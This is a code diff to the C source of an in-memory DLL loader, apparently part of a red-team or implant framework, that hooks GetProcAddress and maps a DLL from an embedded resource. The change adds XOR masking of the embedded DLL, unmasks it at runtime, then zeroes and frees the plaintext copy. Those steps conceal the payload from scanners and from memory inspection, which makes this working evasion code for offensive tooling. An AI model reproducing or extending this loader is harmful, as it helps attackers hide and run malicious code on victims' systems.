@@ -4,6 +4,7 @@
 
 DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$VirtualAlloc ( LPVOID, SIZE_T, DWORD, DWORD );
 DECLSPEC_IMPORT BOOL WINAPI KERNEL32$VirtualProtect ( LPVOID, SIZE_T, DWORD, PDWORD );
+DECLSPEC_IMPORT BOOL WINAPI KERNEL32$VirtualFree ( LPVOID, SIZE_T, DWORD );
 DECLSPEC_IMPORT BOOL WINAPI KERNEL32$FlushInstructionCache(HANDLE, LPCVOID, SIZE_T);
 // MessageBoxA is used in the hooks to demonstrate that the hooks are working, and to show the output of the GetVersions callback
 DECLSPEC_IMPORT int WINAPI USER32$MessageBoxA ( HWND, LPCSTR, LPCSTR, UINT );
@@ -17,10 +18,17 @@ char _DLL_ [0] __attribute__ ( ( section ( "dll" ) ) );
 
 char _PICO_ [ 0 ] __attribute__ ( ( section ( "pico" ) ) );
 
+char _MASK_  [0] __attribute__ ( ( section ( "mask"  ) ) );
+
 typedef struct {
     char data [ 4096 ];
     char code [ 16384 ];
 } PICO;
+
+typedef struct {
+    int  len;
+    char value[];
+} RESOURCE;
 
 int __tag_setup_hooks ( );
 int __tag_set_image_info ( );
@@ -111,10 +119,18 @@ void go(void)
 
     /* call setup_hooks to overwrite funcs.GetProcAddress */
     ( ( SETUP_HOOKS ) PicoGetExport ( pico_src, pico_dst->code, __tag_setup_hooks ( ) ) ) ( &funcs );
+
+    RESOURCE * masked_dll = ( RESOURCE * ) GETRESOURCE ( _DLL_ );
+    RESOURCE * mask_key   = ( RESOURCE * ) GETRESOURCE ( _MASK_ );
                                                      
     /* now we can load the DLL */
+    /* allocate some temporary memory */
+    char * dll_src = KERNEL32$VirtualAlloc ( NULL, masked_dll->len, MEM_COMMIT | MEM_RESERVE | MEM_TOP_DOWN, PAGE_READWRITE );
 
-    char *dll_src = GETRESOURCE(_DLL_);
+    /* unmask and copy it into memory */
+    for ( int i = 0; i < masked_dll->len; i++ ) {
+        dll_src [ i ] = masked_dll->value [ i ] ^ mask_key->value [ i % mask_key->len ];
+    }
 
     DLLDATA dll_data;
     ParseDLL(dll_src, &dll_data);
@@ -131,6 +147,15 @@ void go(void)
     LoadDLL(&dll_data, dll_src, dll_dst);
     
 	ProcessImports(&funcs, &dll_data, dll_dst);
+
+    /* wipe and free the unmasked DLL copy — only dll_dst is needed from here */
+    volatile char * p = ( volatile char * ) dll_src;
+    for ( int z = 0; z < masked_dll->len; z++ )
+        p [ z ] = 0;
+    KERNEL32$VirtualFree ( dll_src, 0, MEM_RELEASE );
+
+    /* re-parse from the mapped image since dll_src is gone */
+    ParseDLL ( dll_dst, &dll_data );
 
     /* tell the PICO (EkkoObf) which region is the DLL image */
     ( ( SET_IMAGE_INFO ) PicoGetExport ( pico_src, pico_dst->code, __tag_set_image_info ( ) ) ) ( dll_dst, SizeOfDLL(&dll_data) );
